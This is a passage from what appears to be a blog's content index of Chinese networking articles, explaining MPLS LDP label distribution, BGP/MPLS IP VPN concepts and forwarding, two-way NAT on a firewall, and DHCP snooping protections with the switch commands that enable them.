in-label in-label [ lsrid ingress-lsr-id tunnel-id tunnel-id ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置本节点为指定LSP的Egress。</p><h2 id="动态分配标签"><a href="#动态分配标签" class="headerlink" title="动态分配标签"></a>动态分配标签</h2><p>动态分配标签就是利用标签分配协议来进行LSP的建立，动态分配标签的协议有几种，但是最为常用也是最好的协议就是LDP。在某些复杂网络环境下，使用手工建立LSP的方法过于复杂并及其容易出错。通过LDP协议，标签交换路由器LSR（Label Switched Router）可以把网络层的路由信息直接映射到数据链路层的交换路径上，动态建立起网络层的LSP。目前，LDP广泛地应用在VPN服务上，具有组网、配置简单、支持基于路由动态建立LSP、支持大容量LSP等优点。</p><p>标签分发协议LDP（Label Distribution Protocol）是多协议标签交换MPLS的一种控制协议，相当于传统网络中的信令协议，负责转发等价类FEC（Forwarding Equivalence Class）的分类、标签的分配以及标签交换路径LSP（Label Switched Path）的建立和维护等操作。LDP规定了标签分发过程中的各种消息以及相关处理过程。</p><h2 id="LDP基本概念："><a href="#LDP基本概念：" class="headerlink" title="LDP基本概念："></a>LDP基本概念：</h2><ol><li>LDP会话：LDP会话用于LSR之间交换标签映射、释放等消息。只有存在对等体才能建立LDP会话，LDP会话分为两种类型：<br>本地LDP会话（Local LDP Session）：建立会话的两个LSR之间是直连的。<br>远端LDP会话（Remote LDP Session）：建立会话的两个LSR之间可以是直连的，也可以是非直连的。<br>本地LDP会话和远端LDP会话可以共存。</li><li>LDP对等体：LDP对等体是指相互之间存在LDP会话、使用LDP来交换标签消息的两个LSR。LDP对等体通过它们之间的LDP会话获得对方的标签。</li><li>LDP邻接体：当一台LSR接收到对端发送过来的Hello消息后LDP邻接体建立。LDP邻接体存在两种类型：<br>本地邻接体（Local Adjacency）：以组播形式发送Hello消息（即链路Hello消息）发现的邻接体叫做本地邻接体。<br>远端邻接体（Remote Adjacency）：以单播形式发送Hello消息（即目标Hello消息）发现的邻接体叫做远端邻接体。<br>LDP通过邻接体来维护对等体的存在，对等体的类型取决于维护它的邻接体的类型。一个对等体可以由多个邻接体来维护，如果由本地邻接体和远端邻接体两者来维护，则对等体类型为本远共存对等体。</li></ol><h2 id="LDP工作机制："><a href="#LDP工作机制：" class="headerlink" title="LDP工作机制："></a>LDP工作机制：</h2><p>简单来说：LDP的存在就是为了建立LSP，完成标签的交换。怎么来实现这个功能呢？</p><ul><li>两个LSR之间会形成LDP的邻居关系，交换LSP消息报文，建立LDP session。</li><li>LDP session一旦建立，LSR之间就会发送标签请求和标签映射消息，在LDP对等体之间通告FEC和标签的绑定关系来建立LSP。</li><li>将FEC绑定对应的标签后，LSP建立。数据报文按照这个LSP来转发。</li></ul><h2 id="LDP消息类型："><a href="#LDP消息类型：" class="headerlink" title="LDP消息类型："></a>LDP消息类型：</h2><p>LDP协议主要使用四类消息：</p><ul><li>发现（Discovery）消息：用于通告和维护网络中LSR的存在，如Hello消息。</li><li>会话（Session）消息：用于建立、维护和终止LDP对等体之间的会话，如Initialization消息、Keepalive消息。</li><li>通告（Advertisement）消息：用于创建、改变和删除FEC的标签映射。</li><li>通知（Notification）消息：用于提供建议性的消息和差错通知。</li></ul><p>为保证LDP消息的可靠发送，除了Discovery消息使用UDP（User Datagram Protocol）传输外，LDP的Session消息、Advertisement消息和Notification消息都使用TCP（Transmission Control Protocol）传输。</p><h2 id="LDP会话的建立："><a href="#LDP会话的建立：" class="headerlink" title="LDP会话的建立："></a>LDP会话的建立：</h2><p><img src="https://i.loli.net/2018/01/31/5a716acab6a5a.png" alt="fig_dc_fd_mpls-ldp_000702.png"></p><ol><li>两个LSR之间互相发送Hello消息。Hello消息中携带传输地址（即设备的IP地址），双方使用传输地址建立LDP会话。</li><li>传输地址较大的一方作为主动方，发起建立TCP连接。如图所示，LSR_1作为主动方发起建立TCP连接，LSR_2作为被动方等待对方发起连接。</li><li>TCP连接建立成功后，由主动方LSR_1发送初始化消息，协商建立LDP会话的相关参数。LDP会话的相关参数包括LDP协议版本、标签分发方式、Keepalive保持定时器的值、最大PDU长度和标签空间等。</li><li>被动方LSR_2收到初始化消息后，LSR_2接受相关参数，则发送初始化消息，同时发送Keepalive消息给主动方LSR_1。如果被动方LSR_2不能接受相关参数，则发送Notification消息终止LDP会话的建立。<br>初始化消息中包括LDP协议版本、标签分发方式、Keepalive保持定时器的值、最大PDU长度和标签空间等。</li><li>主动方LSR_1收到初始化消息后，接受相关参数，则发送Keepalive消息给被动方LSR_2。如果主动方LSR_1不能接受相关参数，则发送Notification消息给被动方LSR_2终止LDP会话的建立。</li></ol><p>当双方都收到对端的Keepalive消息后，LDP会话建立成功。</p><h2 id="LDP-LSP的建立"><a href="#LDP-LSP的建立" class="headerlink" title="LDP LSP的建立"></a>LDP LSP的建立</h2><p>当LDP会话建立完成后，开始发送标签请求来进行FEC和标签的映射。进而建立LSP。<br>但是如何发送标签请求，由谁来发送，发过来的标签请求我应该怎么处理。等问题则需要标签发布方式，标签分配控制方式和标签保持方式来决定。<br><strong>这部分简单总结一下，不在赘述，详细的请参考相关资料。</strong></p><h3 id="标签发布方式（Label-Advertisement-Mode）"><a href="#标签发布方式（Label-Advertisement-Mode）" class="headerlink" title="标签发布方式（Label Advertisement Mode）"></a>标签发布方式（Label Advertisement Mode）</h3><p>标签发布方式有两种方式。具有标签分发邻接关系的上游LSR和下游LSR必须对使用的标签发布方式达成一致。</p><p>下游自主方式DU（Downstream Unsolicited）：对于一个特定的FEC，LSR无需从上游获得标签请求消息即进行标签分配与分发。</p><p>下游按需方式DoD（Downstream on Demand）：对于一个特定的FEC，LSR获得标签请求消息之后才进行标签分配与分发。</p><h3 id="标签分配控制方式（Label-Distribution-Control-Mode）"><a href="#标签分配控制方式（Label-Distribution-Control-Mode）" class="headerlink" title="标签分配控制方式（Label Distribution Control Mode）"></a>标签分配控制方式（Label Distribution Control Mode）</h3><p>标签分配控制方式是指在LSP的建立过程中，LSR分配标签时采用的处理方式。</p><p>独立标签分配控制方式（Independent）：本地LSR可以自主地分配一个标签绑定到某个FEC，并通告给上游LSR，而无需等待下游的标签。</p><p>有序标签分配控制方式（Ordered）：对于LSR上某个FEC的标签映射，只有当该LSR已经具有此FEC下一跳的标签映射消息、或者该LSR就是此FEC的出节点时，该LSR才可以向上游发送此FEC的标签映射。</p><h3 id="标签保持方式（Label-Retention-Mode）"><a href="#标签保持方式（Label-Retention-Mode）" class="headerlink" title="标签保持方式（Label Retention Mode）"></a>标签保持方式（Label Retention Mode）</h3><p>标签保持方式是指LSR对收到的、但目前暂时不需要的标签映射的处理方式。</p><p>自由标签保持方式（Liberal）：对于从邻居LSR收到的标签映射，无论邻居LSR是不是自己的下一跳都保留。</p><p>保守标签保持方式（Conservative）：对于从邻居LSR收到的标签映射，只有当邻居LSR是自己的下一跳时才保留。</p><h2 id="建立过程"><a href="#建立过程" class="headerlink" title="建立过程"></a>建立过程</h2><p><img src="https://i.loli.net/2018/01/31/5a716faa16ec5.png" alt="fig_dc_fd_mpls-ldp_000806.png"></p><ol><li>缺省情况下，网络的路由改变时，如果有一个边缘节点（Egress）发现自己的路由表中出现了新的主机路由，并且这一路由不属于任何现有的FEC，则该边缘节点需要为这一路由建立一个新的FEC。</li><li>如果MPLS网络的Egress有可供分配的标签，则为FEC分配标签，并主动向上游发出标签映射消息，标签映射消息中包含分配的标签和绑定的FEC等信息。</li><li>Transit收到标签映射消息后，判断标签映射的发送者（Egress）是否为该FEC的下一跳。若是，则在其标签转发表中增加相应的条目，然后主动向上游LSR发送对于指定FEC的标签映射消息。</li><li>Ingress收到标签映射消息后，判断标签映射的发送者（Transit）是否为该FEC的下一跳。若是，则在标签转发表中增加相应的条目。这时，就完成了LSP的建立，接下来就可以对该FEC对应的数据报文进行标签转发。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> MPLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MPLS </tag>
            
            <tag> lsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mpls vpn</title>
      <link href="2018/06/19/mpls-vpn/"/>
      <url>2018/06/19/mpls-vpn/</url>
      
        <content type="html"><![CDATA[<h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p>前面介绍了mpls的基础以及mpls lsp的建立，mpls在当前网络中的应用主要是mpls vpn。其实mpls vpn应该叫BGP/MPLS ip vpn,因为mpls vpn的建立除了需要mpls和ip协议还需要BGP的一个扩展协议MP-BGP。并且mpls vpn主要承载在运营商网络上，为多个分支站点提供vpn服务。<br>传统的VPN通过在所有站点间建立全连接隧道或者永久虚链路PVC（Permanent Virtual Circuit）的方式实现，不易维护和扩展，尤其是向已有的VPN加入新的站点时，需要同时修改所有接入此VPN站点的边缘节点的配置。<br>BGP/MPLS IP VPN基于对等体模型，这种模型使得服务提供商和用户可以交换路由，服务提供商转发用户站点间的数据而不需要用户的参与。相比较传统的VPN，BGP/MPLS IP VPN更容易扩展和管理。新增一个站点时，只需要修改提供该站点业务的边缘节点的配置。<br>BGP/MPLS IP VPN支持地址空间重叠、支持重叠VPN、组网方式灵活、可扩展性好，并能够方便地支持MPLS QoS和MPLS TE，成为在IP网络运营商提供增值业务的重要手段，因此得到越来越多的应用。</p><h3 id="几个概念："><a href="#几个概念：" class="headerlink" title="几个概念："></a>几个概念：</h3><p><img src="https://i.loli.net/2018/02/05/5a781f85ddf99.png" alt="fig_dc_fd_l3vpn_000201s.png"></p><ul><li><p><strong>CE（Customer Edge）</strong>：用户网络边缘设备，有接口直接与服务提供商网络相连。CE可以是路由器或交换机，也可以是一台主机。通常情况下，CE“感知”不到VPN的存在，也不需要支持MPLS。</p></li><li><p><strong>PE（Provider Edge）</strong>：是服务提供商网络的边缘设备，与CE直接相连。在MPLS网络中，对VPN的所有处理都发生在PE上，对PE性能要求较高。</p></li><li><p><strong>P（Provider）</strong>：服务提供商网络中的骨干设备，不与CE直接相连。P设备只需要具备基本MPLS转发能力，不维护VPN信息。</p></li><li><p><strong>site</strong>: site是指一个不需要运营商网络互连的独立的ip网络站点，简而言之就是分布在不同地域的一个公司。但是如果两个公司分布在两个地域，但他们之间通过专线互连，这两个公司也属于一个site。</p></li><li><p><strong>vpn实例</strong>：在BGP/MPLS IP VPN中，不同VPN之间的路由隔离通过VPN实例（VPN-instance）实现。VPN实例也称为VPN路由转发表VRF（VPN Routing and Forwarding table）。PE上存在多个路由转发表，包括一个公网路由转发表，以及一个或多个VPN路由转发表。</p></li></ul><p><strong>两个重要概念：</strong></p><ul><li><strong>RD（Route Distinguisher）</strong>：RD用来区分来自不同site的相同ip地址。</li></ul><p>传统BGP无法正确处理地址空间重叠的VPN的路由。假设VPN1和VPN2都使用了10.110.10.0/24网段的地址，并各自发布了一条去往此网段的路由。虽然本端PE通过不同的VPN实例可以区分地址空间重叠的VPN的路由，但是这些路由发往对端PE后，由于不同VPN的路由之间不进行负载分担，因此对端PE将根据BGP选路规则只选择其中一条VPN路由，从而导致去往另一个VPN的路由丢失。<br>PE之间使用MP-BGP（Multiprotocol Extensions for BGP-4，BGP-4的多协议扩展）来发布VPN路由，并使用VPN-IPv4地址来解决上述问题。<br>VPN-IPv4地址共有12个字节，包括8字节的路由标识符<strong>RD（Route Distinguisher）</strong>和4字节的IPv4地址前缀。</p><p><img src="https://i.loli.net/2018/02/05/5a78239bea5fd.png" alt="fig_dc_fd_l3vpn_000504s.png"></p><p>RD用于区分使用相同地址空间的IPv4前缀，增加了RD的IPv4地址称为VPN-IPv4地址（即VPNv4地址）。PE从CE接收到IPv4路由后，转换为全局唯一的VPN-IPv4路由，并在公网上发布。</p><ul><li><strong>VPN Target</strong>：BGP/MPLS IP VPN使用BGP扩展团体属性－VPN Target（也称为Route Target）来控制VPN路由信息的发布。</li></ul><p>每个VPN实例关联一个或多个VPN Target属性。有两类<strong>VPN Target</strong>属性：<br>Export Target：本地PE从直接相连Site学到IPv4路由后，转换为VPN-IPv4路由，并为这些路由设置Export Target属性。Export Target属性作为BGP的扩展团体属性随路由发布。<br>Import Target：PE收到其它PE发布的VPN-IPv4路由时，检查其Export Target属性。当此属性与PE上某个VPN实例的Import Target匹配时，PE就把路由加入到该VPN实例中。<br>在BGP/MPLS IP VPN网络中，通过VPN Target属性来控制VPN路由信息在各Site之间的发布和接收。VPN Export Target和Import Target的设置相互独立，并且都可以设置多个值，能够实现灵活的VPN访问控制，从而实现多种VPN组网方案。</p><h3 id="两层标签分配："><a href="#两层标签分配：" class="headerlink" title="两层标签分配："></a>两层标签分配：</h3><blockquote><p>在讲MPLS VPN的标签之前，大家应该有这么一个基本的认识：</p></blockquote><ol><li>BGP/IP MPLS VPN是因为有一些原因必须要用到mpls的标签技术。第一个原因是为了解决P设备上没有VPN路由导致的路由黑洞问题（外层标签），第二个原因是为了解决数据报文到达对端PE后，不知道发往哪个CE的问题（内层标签）。</li><li>整个路由的传递过程和mpls没有半毛钱关系，只需要mp-bgp和igp协议就可以完成。</li></ol><p>mpls vpn的建立其实就是使用标签来建立一条“隧道”，用户数据就可以沿着这条“虚拟隧道”来进行转发。mpls vpn需要两层标签，这就是前面介绍的标签栈。外层标签是由mpls ldp来分配的，为了解决BGP路由黑洞问题。内层标签是由mp-bgp协议为私网路由分配的，并且mp-bgp会为这条私网路由打上RD，这时这条路由就会被称为vpn-v4路由。这条路由还会随着bgp协议来进行传递到对端PE，然后对端PE需要根据内层标签来判断这条路由需要进入哪一个CE。</p><p><strong>当标签分配完成，两个PE之间的lSP建立完成后。私网路由在PE上是怎样查找路由，进入对应的隧道，又是怎样一步一步转发到对端PE，剥掉标签后到达CE的呢？</strong></p><h4 id="这就涉及到两个概念：私网路由交叉和公网隧道迭代"><a href="#这就涉及到两个概念：私网路由交叉和公网隧道迭代" class="headerlink" title="这就涉及到两个概念：私网路由交叉和公网隧道迭代"></a>这就涉及到两个概念：私网路由交叉和公网隧道迭代</h4><p>两台PE之间通过MP-BGP传播的路由是VPNv4路由。当接收到VPNv4路由，PE先进行如下处理：</p><ul><li><p>检查其下一跳是否可达。如果下一跳不可达，该路由被丢弃。</p></li><li><p>对于RR发送过来的VPNv4路由，如果收到的路由中cluster_list包含自己的cluster_id，则丢弃这条路由。</p></li><li><p>进行BGP的路由策略过滤，如果不通过，则丢弃该路由。</p></li></ul><p>之后，PE把没有丢弃的路由与本地的各个VPN实例的Import Target属性匹配。VPNv4路由与本地VPN实例的Import VPN-Target进行匹配的过程称为<strong>私网路由交叉</strong>。</p><p>PE上有种特殊的路由，即来自本地CE的属于不同VPN的路由。对于这种路由，如果其下一跳直接可达或可迭代成功，PE也将其与本地的其他VPN实例的Import Target属性匹配，该过程称为<strong>本地交叉</strong>。例如：CE1所在的Site属于VPN1，CE2所在的Site属于VPN2，且CE1和CE2同时接入PE1。当PE1收到来自CE1的VPN1的路由时，也会与VPN2对应的VPN实例的Import Target属性匹配。</p><blockquote><p>为了能够将报文正确转发出去，BGP设备必须先找到一个直接可达的地址，通过这个地址到达路由表中指示的下一跳。在上述过程中，去往直接可达地址的路由被称为依赖路由，BGP路由依赖于这些路由指导报文转发。根据下一跳地址找到依赖路由的过程就是<strong>路由迭代</strong>。</p></blockquote><p><strong>公网隧道迭代</strong></p><p>为了将私网流量通过公网传递到另一端，需要有一条公网隧道承载这个私网流量。因此私网路由交叉完成后，需要根据目的IPv4前缀进行<strong>路由迭代</strong>，查找合适的隧道（本地交叉的路由除外）；只有<strong>隧道迭代</strong>成功，该路由才被放入对应的VPN实例路由表。将路由迭代到相应的隧道的过程叫做<strong>隧道迭代</strong>。</p><p>隧道迭代成功后，保留该隧道的标识符（Tunnel ID），供后续转发报文时使用。<strong>Tunnel ID用于唯一标识一条隧道</strong>。VPN报文转发时根据Tunnel ID查找对应的隧道，然后从隧道上发送出去。</p><h3 id="路由发布和转发过程："><a href="#路由发布和转发过程：" class="headerlink" title="路由发布和转发过程："></a>路由发布和转发过程：</h3><p><strong>BGP/MPLS IP VPN的路由发布</strong></p><p>基本BGP/MPLS IP VPN组网中，VPN路由信息的发布涉及CE和PE，P设备只维护骨干网的路由，不需要了解任何VPN路由信息。PE设备一般维护所有VPN路由。</p><p>VPN路由信息的发布过程包括三部分：本地CE到入口PE、入口PE到出口PE、出口PE到远端CE。完成这三部分后，本地CE与远端CE之间建立可达路由，VPN路由信息能够在骨干网上发布。</p><p>－　本地CE到入口PE的路由信息交换</p><p>CE与直接相连的PE建立邻居或对等体关系后，把本站点的IPv4路由发布给PE。CE与PE之间可以使用静态路由、RIP（Routing Information Protocol）、OSPF（Open Shortest Path First）、IS-IS（Intermediate System to Intermediate System）或BGP（Border Gateway Protocol）。无论使用哪种路由协议，CE发布给PE的都是标准的IPv4路由。<strong>其实是vpnv4路由，在PE上的全局路由表中是看不到用户的私网路由的，只有在VPN路由表中才可以看到。</strong></p><ul><li>入口PE到出口PE的路由信息交换</li></ul><p>PE从CE学到VPN路由信息后，存放到VPN实例中。同时，为这些标准IPv4路由增加RD，形成VPN-IPv4路由。</p><p>入口PE通过MP-BGP的Update报文把VPN-IPv4路由发布给出口PE。Update报文中携带Export VPN Target属性及MPLS标签。</p><p>出口PE收到VPN-IPv4路由后，在下一跳可达的情况下进行路由交叉、隧道迭代和路由优选，决定是否将该路由加入到VPN实例的路由表。被加入到VPN路由表的路由，本地PE为其保留如下信息以供后续转发报文时使用：</p><ol><li>MP-BGP Update消息中携带的MPLS标签值</li><li>Tunnel ID</li></ol><p><strong>关于Tunnel ID的详细介绍请参考：</strong><br><a href="http://www.handbye.cn/916.html">http://www.handbye.cn/916.html</a></p><ul><li>出口PE到远端CE的路由信息交换</li></ul><p>远端CE有多种方式可以从出口PE学习VPN路由，包括静态路由、RIP、OSPF、IS-IS和BGP，与本地CE到入口PE的路由信息交换相同。此处不再赘述。值得注意的是，出口PE发布给远端CE的路由是普通IPv4路由。</p><p><img src="https://i.loli.net/2018/02/06/5a79590291465.png" alt="fig_dc_fd_l3vpn_002001s.png"></p><ol><li><p>在CE2的BGP IPv4单播地址族下引入IGP（Interior Gateway Protocol）路由。</p></li><li><p>CE2将该路由随EBGP的Update消息一起发布给Egress PE。Egress PE从连接CE2的接口收到Update消息，把该路由转化为VPN IPv4路由，加入对应的VPN实例路由表。</p></li><li><p>Egress PE为该路由分配MPLS标签，并将标签和VPN IPv4路由信息加入MP-IBGP的Update消息中的NLRI字段中，Export-RT属性加入MP-BGP Update消息的扩展团体属性字段中，将Update消息发送给Ingress PE。</p></li><li><p>Ingress PE对该路由进行路由交叉。交叉成功则根据路由目的IPv4地址进行隧道迭代，查找合适的隧道。如果迭代成功，则保留该隧道的Tunnel ID和标签，并将路由加入该VPN实例路由表。</p></li><li><p>Ingress PE把该路由通过BGP Update消息发布给CE1。此时路由是普通IPv4路由。</p></li><li><p>CE1收到该路由后，把该路由加入BGP路由表。通过在IGP中引入BGP路由的方法可使CE1把该路由加入IGP路由表。</p></li></ol><p>上面过程只是将CE2的路由发布给CE1。要实现CE1与CE2的互通，还需要将CE1的路由发布给CE2，其过程与上面的步骤类似，此处不再赘述。</p><p><strong>BGP/MPLS IP VPN的报文转发</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/9QrUQx.gif" alt="9QrUQx.gif"></p><ol><li><p>CE1发送一个VPN报文。</p></li><li><p>Ingress PE从绑定了VPN实例的接口上接收VPN数据包后进行如下操作：</p></li></ol><ul><li><p>先根据绑定的VPN实例的RD查找对应VPN的转发表。</p></li><li><p>匹配目的IPv4前缀，查找对应的Tunnel ID。</p></li><li><p>将报文打上对应的标签（I-L），根据Tunnel-ID找到隧道。</p></li><li><p>将报文从隧道发送出去。此例的隧道是LSP，则打上公网（外层）MPLS标签头（O-L1）。</p></li></ul><p>接着，该报文携带两层MPLS标签穿越骨干网。骨干网的每台P设备都对该报文进行外层标签交换。</p><ol start="3"><li><p>P2收到该携带两层标签的报文，交给MPLS协议处理。由于使能了倒数第二跳弹出功能，MPLS协议将去掉外层标签（O-L2），将携带内层标签的报文发送给Egress PE。</p></li><li><p>此时Egress PE就可以看见内层标签，发现该标签处于栈底，将内层标签剥离。</p></li><li><p>Egress PE将报文从对应出接口发送给CE2。此时报文是个纯IP报文。</p><p>这样，报文就成功地从CE1传到CE2了。CE2按照普通的IP转发过程将报文传送到目的地。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MPLS </tag>
            
            <tag> vpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双向NAT</title>
      <link href="2018/06/19/two-way-NAT/"/>
      <url>2018/06/19/two-way-NAT/</url>
      
        <content type="html"><![CDATA[<h2 id="出现背景"><a href="#出现背景" class="headerlink" title="出现背景:"></a>出现背景:</h2><p><img src="https://raw.githubusercontent.com/handbye/images/master/b9811c8993f5ed74fe6e60a150e3a5e9.png" alt="b9811c8993f5ed74fe6e60a150e3a5e9.png"></p><p>在防火墙上部署了NATserver后，外网用户可以访问内部服务器。一般内部服务器都会通过一个域名进行解析。但如果内网用户也想通过此域名访问服务器就会出现问题。</p><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析:"></a>原因分析:</h2><ol><li>防火墙上配置了NATserver，将公网ip    200.1.1.100映射为服务器的私网地址192.168.1.100。数据包会交给服务器。</li><li>pc访问服务器时的目的地址为200.1.1.100，此时防火墙会做转换，将目的地址转换为了192.168.1.100，源地址不变为192.168.1.1</li><li>去时的数据包走向没有问题，分析回来的，回来时就会出现问题。</li><li>由于服务器和PC处于同一网段（防火墙已放行PC所在区域和服务器所在区域的数据），回包时服务器发送ARP报文找到了PC的MAC地址，三层封装时源IP地址为：192.168.1.100，目的IP地址为192.168.1.1。源目MAC地址分别为服务器的MAC地址和PC的MAC地址。数据包直接走二层过去。</li><li>PC和服务进行通信需要建立TCP的三次握手,第一次握手时的目的IP地址为200.1.1.100，但此时却收到了192.168.1.100的回包。怎么办，凌乱了，握手不成功。TCP连接无法建立。</li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案:"></a>解决方案:</h2><blockquote><p>上述问题产生的根本原因是PC访问服务器的数据包来回路径不一致，要解决这个问题只要使服务器访问PC的数据包经过防火墙即可。</p></blockquote><p>防火墙的内网接口地址为192.168.1.254，在防火墙上在做一个源NAT将PC访问服务器的源地址也做一个转换，将192.168.1.1转换为192.168.1.254。</p><p><strong>转换过后在分析：</strong></p><ol><li>过去的数据包走向和上述相同，不再分析。只不过在服务器看来，访问自己的地址变成了192.168.1.254。</li><li>回来时，服务器会把数据包交给192.168.1.254，此时由于防火墙上做了NAT srver,会将服务器的地址转换为200.1.1.100，由于做了源NAT，防火墙将目的地址192.168.1.254转换为192.168.1.1。此时就与之前的TCP三次握手对应上了，PC一看与我握手的是200.1.1.100，成功握手。</li><li>数据包来回路径一致，成功解救问题。</li></ol><p>参考:<br><a href="http://blog.sina.com.cn/s/blog_406127500102uwh3.html">http://blog.sina.com.cn/s/blog_406127500102uwh3.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> NAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NAT </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP snooping总结</title>
      <link href="2018/06/18/DHCP-snooping-summary/"/>
      <url>2018/06/18/DHCP-snooping-summary/</url>
      
        <content type="html"><![CDATA[<p>DHCP服务已是网络中必不可少的服务之一。随着DHCP服务的部署，一些安全问题也逐渐暴露出一些问题：</p><ul><li>DHCP报文泛红攻击</li><li>仿冒DHCP报文攻击</li><li>DHCP仿冒者攻击</li><li>DHCP server拒绝服务攻击</li><li>仿冒DHCP服务器攻击</li></ul><p>DHCP Snooping是DHCP（Dynamic Host Configuration Protocol）的一种安全特性，用于保证DHCP客户端从合法的DHCP服务器获取IP地址，并记录DHCP客户端IP地址与MAC地址等参数的对应关系，防止网络上针对DHCP攻击。</p><blockquote><p>这里要注意的是：DHCP snooping 只是会动态的生成绑定表，需要结合其它功能和特性来实现安全防护。</p></blockquote><h3 id="1-DHCP报文泛红攻击："><a href="#1-DHCP报文泛红攻击：" class="headerlink" title="1.DHCP报文泛红攻击："></a>1.DHCP报文泛红攻击：</h3><p> 在DHCP网络环境中，若存在DHCP用户短时间内向设备发送大量的DHCP报文，将会对设备的性能造成巨大的冲击以致可能会导致设备无法正常工作。通过使能对DHCP报文上送DHCP报文处理单元的速率进行检测功能将能够有效防止DHCP报文泛洪攻击。</p><p><strong>解决办法：</strong><br>配置限制DHCP报文的上送速率，可在系统视图、VLAN视图或接口视图下执行。</p><p>执行命令<code>dhcp snooping check dhcp-rate enable</code>，使能对DHCP报文上送DHCP报文处理单元的速率进行检测功能。<br>缺省情况下，未使能对DHCP报文上送DHCP报文处理单元的速率进行检测功能。</p><p>执行命令<code>dhcp snooping check dhcp-rate rate</code>，配置DHCP报文上送DHCP报文处理单元的最大允许速率。<br>缺省情况下，全局DHCP报文上送DHCP报文处理单元的最大允许速率为<strong>100pps</strong>，接口下DHCP报文上送DHCP报文处理单元的最大允许速率为在系统视图下配置的值。</p><h3 id="2-仿冒DHCP报文攻击："><a href="#2-仿冒DHCP报文攻击：" class="headerlink" title="2.仿冒DHCP报文攻击："></a>2.仿冒DHCP报文攻击：</h3><p>在DHCP网络环境中，若攻击者仿冒合法用户的DHCP Request报文发往DHCP Server，将会导致用户的IP地址租约到期之后不能够及时释放，以致合法用户无法使用该IP地址；若攻击者仿冒合法用户的DHCP Release报文发往DHCP Server，将会导致用户异常下线。<br>在生成DHCP Snooping绑定表后，设备可根据绑定表项，对DHCP Request报文或DHCP Release报文进行匹配检查，只有匹配成功的报文设备才将其转发，否则将丢弃。这将能有效的防止非法用户通过发送伪造DHCP Request或DHCP Release报文冒充合法用户续租或释放IP地址。</p><p><strong>解决办法：</strong><br>使能对DHCP报文进行绑定表匹配检查的功能，可在系统视图、VLAN视图或接口视图下进行配置。</p><p>执行命令<code>dhcp snooping check dhcp-request enable vlan &#123; vlan-id1 [ to vlan-id2 ] &#125;&amp;&lt;1-10&gt;</code>，使能对从指定VLAN内上送的DHCP报文进行绑定表匹配检查的功能。<br>缺省情况下，未使能对DHCP报文进行绑定表匹配检查的功能。</p><p>在VLAN或者接口视图下：<br>执行命令<code>dhcp snooping check dhcp-request enable</code>，使能对DHCP报文进行绑定表匹配检查的功能。<br>缺省情况下，未使能对DHCP报文进行绑定表匹配检查的功能。</p><h3 id="3-DHCP仿冒者攻击："><a href="#3-DHCP仿冒者攻击：" class="headerlink" title="3. DHCP仿冒者攻击："></a>3. DHCP仿冒者攻击：</h3><p>此功能需要结合IPSG来实现：</p><p>随着网络规模越来越大，通过伪造源IP地址实施的网络攻击（简称IP地址欺骗攻击）也逐渐增多。一些攻击者通过伪造合法用户的IP地址获取网络访问权限，非法访问网络，甚至造成合法用户无法访问网络，或者信息泄露。IPSG针对IP地址欺骗攻击提供了一种防御机制，可以有效阻止此类网络攻击行为。<br>一个典型的利用IPSG防攻击的示例如图1所示，非法主机伪造合法主机的IP地址获取上网权限。此时，通过在Switch的接入用户侧的接口或VLAN上部署IPSG功能，Switch可以对进入接口的IP报文进行检查，丢弃非法主机的报文，从而阻止此类攻击。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/c87f8b82362e990fa4a1d7043e9a7cd3-1.png" alt="c87f8b82362e990fa4a1d7043e9a7cd3-1.png"></p><p>IPSG利用绑定表（源IP地址、源MAC地址、所属VLAN、入接口的绑定关系）去匹配检查二层接口上收到的IP报文，只有匹配绑定表的报文才允许通过，其他报文将被丢弃。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/e90a64951f911bdeb7ddc0f6f94eef2d.png" alt="e90a64951f911bdeb7ddc0f6f94eef2d.png"></p><p>绑定表生成后，IPSG基于绑定表向指定的接口或者指定的VLAN下发ACL，由该ACL来匹配检查所有IP报文。主机发送的报文，只有匹配绑定表才会允许通过，不匹配绑定表的报文都将被丢弃。当绑定表信息变化时，设备会重新下发ACL。缺省情况下，如果在没有绑定表的情况下使能了IPSG，设备会允许IP协议报文通过，但是会拒绝所有的数据报文。</p><blockquote><p>IPSG只匹配检查主机发送的IP报文，对于ARP、PPPoE等非IP报文，IPSG不做匹配检查。</p></blockquote><p> <strong>IPSG实现原理图</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/1c5810a02d5d07ecb3742bed55f013ed.gif" alt="1c5810a02d5d07ecb3742bed55f013ed.gif"></p><h3 id="4-DHCP-server拒绝服务攻击"><a href="#4-DHCP-server拒绝服务攻击" class="headerlink" title="4.DHCP server拒绝服务攻击"></a>4.DHCP server拒绝服务攻击</h3><p>若在网络中存在DHCP用户恶意申请IP地址，将会导致IP地址池中的IP地址快速耗尽以致DHCP Server无法为其他合法用户分配IP地址。另一方面，DHCP Server通常仅根据CHADDR（client hardware address）字段来确认客户端的MAC地址。如果攻击者通过不断改变DHCP Request报文中的CHADDR字段向DHCP Server申请IP地址，将会导致DHCP Server上的地址池被耗尽，从而无法为其他正常用户提供IP地址。<br>为了防止某些端口的DHCP用户恶意申请IP地址，可配置接口允许学习的DHCP Snooping绑定表项的最大个数来控制上线用户的个数，当用户数达到该值时，则任何用户将无法通过此接口成功申请到IP地址。为了防止攻击者不断改变DHCP Request报文中的CHADDR字段进行攻击，可使能检测DHCP Request报文帧头MAC地址与DHCP数据区中CHADDR字段是否相同的功能，相同则转发报文，否则丢弃。</p><p><strong>解决办法：</strong><br>配置接口允许学习的DHCP Snooping绑定表项的最大个数，可在系统视图、VLAN视图或接口视图下配置。</p><p>执行命令<code>dhcp snooping max-user-number max-number vlan 